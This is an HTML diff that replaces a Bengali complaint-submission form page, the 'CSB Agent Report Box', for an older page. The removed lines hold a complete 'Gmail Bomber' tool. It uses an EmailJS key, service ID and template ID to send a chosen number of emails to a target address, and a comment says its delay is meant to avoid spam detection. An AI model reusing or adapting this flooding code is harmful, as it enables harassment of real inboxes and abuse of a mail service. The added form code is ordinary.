@@ -1,80 +1,549 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail Bomber Pro - Hex</title>
-    <style>
-        body { margin: 0; padding: 0; background: #000; color: #ff0000; font-family: monospace; overflow: hidden; }
-        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
-        .container { text-align: center; margin-top: 10%; background: rgba(0,0,0,0.9); padding: 30px; border: 2px solid #ff0000; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 0 20px #ff0000; border-radius: 10px; }
-        input { background: #111; color: #ff0000; border: 1px solid #ff0000; padding: 12px; margin: 8px; width: 280px; text-align: center; font-size: 16px; outline: none; }
-        button { background: #ff0000; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 18px; transition: 0.4s; }
-        button:hover { background: #fff; color: #ff0000; }
-        #display { margin-top: 25px; font-size: 1.3em; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
-    </style>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CSB Agent Report Box</title>
+
+  <style>
+    *{box-sizing:border-box}
+
+    body{
+      margin:0;
+      min-height:100vh;
+      font-family:Arial,sans-serif;
+      color:#e8eefc;
+      background:radial-gradient(circle at 20% 15%,#0b1a2f,#04060a);
+      overflow-x:hidden;
+    }
+
+    #matrix{
+      position:fixed;
+      inset:0;
+      width:100%;
+      height:100%;
+      z-index:-2;
+    }
+
+    /* Main Card */
+    .wrap{
+      max-width:560px;
+      margin:22px auto;
+      padding:18px;
+      border-radius:22px;
+      background:rgba(16,24,40,.78);
+      backdrop-filter:blur(10px);
+      box-shadow:0 18px 60px rgba(0,0,0,.55);
+
+      position: relative;     /* ✅ timeDock inside wrap */
+      padding-top: 64px;      /* ✅ timeDock এর জায়গা */
+    }
+
+    .topRow{display:flex;gap:16px}
+    .leftText{flex:1}
+    h1{margin:0;font-size:26px}
+    .sub{opacity:.9}
+
+    /* Logo */
+    .logoBox{
+      width:80px;height:80px;border-radius:50%;
+      border:2px solid #00ff66;
+      overflow:hidden;
+    }
+    .logoBox img{width:100%;height:100%;object-fit:cover}
+
+    /* Form */
+    input,textarea{
+      width:100%;
+      margin-top:12px;
+      padding:13px;
+      border-radius:14px;
+      background:#0b1220;
+      color:#fff;
+      border:1px solid #263454;
+    }
+    textarea{min-height:140px}
+
+    /* msg colors */
+    #msg{margin-top:10px;font-weight:700}
+    .ok{color:#7cfc9a}
+    .bad{color:#ff8a8a}
+
+    /* Button */
+    button{
+      width:100%;
+      margin-top:16px;
+      padding:14px;
+      border-radius:16px;
+      font-weight:800;
+      background:linear-gradient(135deg,#00ff66,#00c8ff);
+      border:0;
+      cursor:pointer;
+    }
+
+    /* =========================
+       Social (bordered glass + glow)
+       ========================= */
+    .socialBar{
+      position:fixed;
+      left:16px;
+      bottom:16px;
+      display:flex;
+      gap:10px;
+      z-index:60;
+    }
+
+    .socialBtn{
+      width:44px;
+      height:44px;
+      border-radius:14px;
+      display:grid;
+      place-items:center;
+      text-decoration:none;
+
+      background:rgba(16,24,40,.75);
+      border:1px solid rgba(0,255,120,.22);
+
+      box-shadow:
+        0 12px 30px rgba(0,0,0,.45),
+        0 0 0 6px rgba(0,255,120,.06);
+
+      backdrop-filter:blur(10px);
+      transition:transform .15s ease, filter .15s ease;
+    }
+
+    .socialBtn:hover{
+      transform:translateY(-2px);
+      filter:brightness(1.07);
+    }
+
+    .socialBtn svg{
+      width:22px;
+      height:22px;
+      fill:#e8eefc;
+    }
+
+    .socialBtn.fb{
+      border-color: rgba(80,140,255,.55);
+      box-shadow:
+        0 12px 30px rgba(0,0,0,.45),
+        0 0 20px rgba(80,140,255,.18);
+    }
+    .socialBtn.tg{
+      border-color: rgba(0,200,255,.55);
+      box-shadow:
+        0 12px 30px rgba(0,0,0,.45),
+        0 0 20px rgba(0,200,255,.18);
+    }
+
+    /* =========================
+       ✅ Time (TOP LEFT inside wrap)
+       ========================= */
+    .timeDock{
+      position:absolute;
+      left:14px;
+      top:14px;
+      width:132px;
+      padding:10px;
+      border-radius:14px;
+      text-align:center;
+      z-index:5;
+
+      background:rgba(16,24,40,.78);
+      border:1px solid rgba(0,255,120,.25);
+      box-shadow:
+        0 12px 30px rgba(0,0,0,.45),
+        0 0 0 6px rgba(0,255,120,.06);
+      backdrop-filter:blur(10px);
+    }
+
+    .timeDock .timeClock{
+      font-weight:800;
+      font-size:14px;
+      letter-spacing:.2px;
+    }
+
+    .timeDock .timeDate{
+      margin-top:4px;
+      font-size:12px;
+      opacity:.9;
+    }
+
+    /* Footer (NO box, NO border) */
+    .siteFooter{
+      position:fixed;
+      bottom:6px;
+      left:50%;
+      transform:translateX(-50%);
+      text-align:center;
+      font-size:12px;
+      color:#fff;
+      z-index:55;
+      pointer-events:none;
+    }
+    .footerLine{display:block;margin-top:4px}
+
+    /* =========================
+       ✅ Success Modal (Popup)
+       ========================= */
+    .modalOverlay{
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      background: rgba(0,0,0,.55);
+      backdrop-filter: blur(6px);
+    }
+
+    .modalOverlay.show{
+      display: flex;
+    }
+
+    .modalBox{
+      width: min(520px, 92vw);
+      border-radius: 16px;
+      padding: 18px 18px 16px;
+      background: rgba(16,24,40,.92);
+      border: 1px solid rgba(0,255,120,.22);
+      box-shadow: 0 22px 60px rgba(0,0,0,.55);
+    }
+
+    .modalText{
+      color: #e8eefc;
+      font-size: 14px;
+      line-height: 1.55;
+      margin-bottom: 14px;
+    }
+
+    .modalBtn{
+      border: 0;
+      cursor: pointer;
+      padding: 10px 18px;
+      border-radius: 12px;
+      font-weight: 800;
+      color: #07110c;
+      background: linear-gradient(135deg,#00ff66,#00c8ff);
+      float: right;
+    }
+
+    .modalBtn:hover{
+      filter: brightness(1.05);
+    }
+
+    /* ✅ Mobile fix */
+    @media (max-width:480px){
+      .wrap{ padding-top:78px; }
+      .timeDock{
+        left:12px;
+        top:12px;
+        width:128px;
+      }
+      h1{ font-size:22px; }
+      .topRow{ gap:12px; }
+    }
+  </style>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
-    <div class="container">
-        <h1>GMAIL BOMBER</h1>
-        <input type="email" id="target_email" placeholder="Target Gmail Address"><br>
-        <input type="number" id="count" placeholder="Number of Emails"><br>
-        <button onclick="startAttack()">Launch Blast</button>
-        <div id="display">READY TO ATTACK</div>
+
+  <!-- MATRIX BACKGROUND -->
+  <canvas id="matrix"></canvas>
+
+  <div class="wrap">
+
+    <!-- ✅ Time moved here (Top-Left inside wrap) -->
+    <div class="timeDock">
+      <div class="timeClock" id="timeClock">--:--:--</div>
+      <div class="timeDate" id="timeDate">--/--/----</div>
     </div>
 
-    <script>
-        // আপনার Public Key
-        (function() {
-            emailjs.init("AXkdYkhVbL_celZQw"); 
-        })();
+    <div class="topRow">
+      <div class="leftText">
+        <h1>CSB Agent Report Box</h1>
+        <p class="sub">এখানে CSB Agent সম্পর্কিত অভিযোগ/রিপোর্ট জমা দিন।</p>
+      </div>
 
-        async function startAttack() {
-            const email = document.getElementById('target_email').value;
-            const count = parseInt(document.getElementById('count').value);
-            const display = document.getElementById('display');
+      <div class="logoBox">
+        <img src="logo.png" alt="CSB Logo" />
+      </div>
+    </div>
 
-            if(!email || !count) { display.innerText = "Error: Input Missing!"; return; }
+    <form id="complaintForm">
+      <input type="text" id="name" placeholder="আপনার আসল নাম" />
+      <input type="text" id="contact" placeholder="আপনার Gmail দিন" />
+      <input type="text" id="agent" placeholder="আপনার FB / Telegram Agent ID দিন" />
+      <input type="text" id="complainer" placeholder="অভিযুক্ত ব্যক্তির FB / Telegram Agent ID দিন" />
 
-            display.innerText = "Targeting Facebook Security Relay...";
+      <small class="hint">▸ প্রমাণ হিসেবে Screenshot দিন</small>
+      <input type="file" id="proof" accept="image/*" />
+      <small class="hint red">⚠️ শুধু ছবি (image) দিন, সর্বোচ্চ 10MB</small>
 
-            for (let i = 1; i <= count; i++) {
-                try {
-                    // আপনার Service ID এবং নির্দিষ্ট Template ID
-                    await emailjs.send("service_zaiddwh", "template_4zb4ddo", {
-                        to_email: email 
-                    });
+      <input type="text" id="subject" placeholder="অভিযোগের বিষয়" required />
+      <textarea id="details" placeholder="অভিযোগ বিস্তারিত লিখুন..." required></textarea>
 
-                    display.innerText = "BLASTED: " + i + " ALERTS";
-                    // ১.৫ সেকেন্ড বিরতি যাতে দ্রুত স্প্যাম ধরা না পড়ে
-                    await new Promise(res => setTimeout(res, 1500)); 
-                } catch (e) {
-                    display.innerText = "Status: Daily Limit Reached!";
-                    break;
-                }
-            }
-            display.innerText = "MISSION COMPLETED!";
+      <button type="submit" id="btn">Submit Report</button>
+      <div id="msg"></div>
+    </form>
+  </div>
+
+  <!-- ✅ SUCCESS MODAL (Popup) -->
+  <div class="modalOverlay" id="successModal" aria-hidden="true">
+    <div class="modalBox" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+      <div class="modalText" id="modalTitle">
+        আপনার রিপোর্টটি সফলভাবে পাঠানো হয়েছে
+      </div>
+      <button type="button" class="modalBtn" id="modalOkBtn">OK</button>
+    </div>
+  </div>
+
+  <!-- Social (Bottom Left) -->
+  <div class="socialBar">
+    <!-- Facebook -->
+    <a class="socialBtn fb"
+       href="https://www.facebook.com/CyberSentinelBangladesh"
+       target="_blank"
+       rel="noopener noreferrer"
+       title="Facebook"
+       aria-label="Facebook">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M22 12a10 10 0 1 0-11.6 9.9v-7H8v-3h2.4V9.6c0-2.4 1.4-3.8 3.6-3.8 1 0 2 .2 2 .2v2.2h-1.1c-1.1 0-1.4.7-1.4 1.4V12H18l-.6 3h-2.9v7A10 10 0 0 0 22 12z"/>
+      </svg>
+    </a>
+
+    <!-- Telegram -->
+    <a class="socialBtn tg"
+       href="https://t.me/+GtSCf-U5YW5kMmI1"
+       target="_blank"
+       rel="noopener noreferrer"
+       title="Telegram"
+       aria-label="Telegram">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M21.9 4.6c.2.1.2.4.2.6l-3.1 14.7c-.2.9-1.1 1.2-1.9.8l-4.9-3.6-2.4 2.3c-.2.2-.4.3-.7.3l.4-5.6 10.2-9.2c.2-.2 0-.3-.2-.2L7.2 12.2 2.8 10.8c-.9-.3-.9-1.5.1-1.9L20.7 4c.5-.2.9-.2 1.2-.1z"/>
+      </svg>
+    </a>
+  </div>
+
+  <!-- Footer (No box) -->
+  <div class="siteFooter">
+    <span class="footerLine footerCopy">© 2026 Cyber Sentinel Bangladesh. All rights reserved.    Developed by HEXER X NOVA</span>
+    <span class="footerLine footerDev"></span>
+  </div>
+
+  <script>
+    // =========================
+    // MATRIX BACKGROUND
+    // =========================
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
+
+    function resizeCanvas(){
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    resizeCanvas();
+
+    const letters = "アカサタナハマヤラワ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const fontSize = 14;
+    let columns = Math.floor(canvas.width / fontSize);
+    let drops = Array(columns).fill(1);
+
+    function drawMatrix(){
+      ctx.fillStyle = "rgba(0,0,0,0.05)";
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+
+      ctx.fillStyle = "#00ff66";
+      ctx.font = fontSize + "px monospace";
+
+      for(let i=0;i<drops.length;i++){
+        const text = letters.charAt(Math.floor(Math.random()*letters.length));
+        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+
+        if(drops[i]*fontSize > canvas.height && Math.random()>0.975){
+          drops[i]=0;
         }
+        drops[i]++;
+      }
+    }
 
-        // Matrix Effect (Red Theme for Attack Mode)
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01011001"; const fontSize = 16;
-        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#ff0000"; ctx.font = fontSize + "px monospace";
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters[Math.floor(Math.random() * letters.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
+    setInterval(drawMatrix, 40);
+
+    window.addEventListener("resize", () => {
+      resizeCanvas();
+      columns = Math.floor(canvas.width / fontSize);
+      drops = Array(columns).fill(1);
+    });
+
+    // =========================
+    // Live Time (BD)
+    // =========================
+    function startClockBD() {
+      const timeEl = document.getElementById("timeClock");
+      const dateEl = document.getElementById("timeDate");
+      if (!timeEl || !dateEl) return;
+
+      const timeFmt = new Intl.DateTimeFormat("en-GB", {
+        timeZone: "Asia/Dhaka",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: true
+      });
+
+      const dateFmt = new Intl.DateTimeFormat("en-GB", {
+        timeZone: "Asia/Dhaka",
+        day: "2-digit",
+        month: "2-digit",
+        year: "numeric"
+      });
+
+      function tick() {
+        const now = new Date();
+        timeEl.textContent = timeFmt.format(now);
+        dateEl.textContent = dateFmt.format(now);
+      }
+
+      tick();
+      setInterval(tick, 1000);
+    }
+
+    document.addEventListener("DOMContentLoaded", startClockBD);
+
+    // =========================
+    // Helpers: Modal
+    // =========================
+    function openSuccessModal() {
+      const modal = document.getElementById("successModal");
+      const okBtn = document.getElementById("modalOkBtn");
+      if (!modal || !okBtn) return;
+
+      modal.classList.add("show");
+      modal.setAttribute("aria-hidden", "false");
+      okBtn.focus?.();
+
+      okBtn.onclick = () => closeSuccessModal();
+
+      modal.onclick = (e) => {
+        if (e.target === modal) closeSuccessModal();
+      };
+
+      document.addEventListener("keydown", escCloseOnce);
+    }
+
+    function closeSuccessModal() {
+      const modal = document.getElementById("successModal");
+      if (!modal) return;
+
+      modal.classList.remove("show");
+      modal.setAttribute("aria-hidden", "true");
+      document.removeEventListener("keydown", escCloseOnce);
+    }
+
+    function escCloseOnce(e) {
+      if (e.key === "Escape") closeSuccessModal();
+    }
+
+    // =========================
+    // Form Submit (Protected)
+    // =========================
+    const form = document.getElementById("complaintForm");
+    const msg = document.getElementById("msg");
+    const btn = document.getElementById("btn");
+
+    let submitting = false;
+
+    const MAX_MB = 10;
+    const MAX_BYTES = MAX_MB * 1024 * 1024;
+
+    function showMsg(text, type) {
+      if (!msg) return;
+      msg.textContent = text || "";
+      msg.className = type || "";
+    }
+
+    function fileToBase64(file) {
+      return new Promise((resolve, reject) => {
+        const r = new FileReader();
+        r.onload = () => resolve(String(r.result).split(",")[1]);
+        r.onerror = reject;
+        r.readAsDataURL(file);
+      });
+    }
+
+    if (form) {
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        if (submitting) return;
+        submitting = true;
+
+        showMsg("", "");
+        btn.disabled = true;
+        btn.textContent = "Sending...";
+
+        try {
+          const elName = document.getElementById("name");
+          const elContact = document.getElementById("contact");
+          const elAgent = document.getElementById("agent");
+          const elComplainer = document.getElementById("complainer");
+          const elSubject = document.getElementById("subject");
+          const elDetails = document.getElementById("details");
+          const proofInput = document.getElementById("proof");
+
+          const proofFile = proofInput?.files?.[0];
+
+          let proofBase64 = null, proofMime = null, proofName = null;
+
+          if (proofFile) {
+            if (!proofFile.type.startsWith("image/")) {
+              showMsg("❌ শুধু ছবি (image) আপলোড দিন", "bad");
+              return;
             }
+            if (proofFile.size > MAX_BYTES) {
+              showMsg(`❌ ছবি ${MAX_MB}MB এর কম হতে হবে`, "bad");
+              return;
+            }
+            proofMime = proofFile.type;
+            proofName = proofFile.name;
+            proofBase64 = await fileToBase64(proofFile);
+          }
+
+          const payload = {
+            name: (elName?.value || "").trim(),
+            contact: (elContact?.value || "").trim(),
+            agent: (elAgent?.value || "").trim(),
+            complainer: (elComplainer?.value || "").trim(),
+            subject: (elSubject?.value || "").trim(),
+            details: (elDetails?.value || "").trim(),
+            proofBase64,
+            proofMime,
+            proofName
+          };
+
+          const res = await fetch("/api/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
+
+          const data = await res.json().catch(() => ({}));
+
+          if (!res.ok) {
+            const tgDesc = data?.data?.description ? ` (${data.data.description})` : "";
+            showMsg(`❌ ${data?.error || "Error হয়েছে"}${tgDesc}`, "bad");
+            return;
+          }
+
+          form.reset();
+          openSuccessModal();
+        } catch (err) {
+          showMsg("❌ Network / API error", "bad");
+        } finally {
+          submitting = false;
+          btn.disabled = false;
+          btn.textContent = "Submit Report";
         }
-        setInterval(draw, 33);
-    </script>
+      });
+    }
+  </script>
 </body>
 </html>
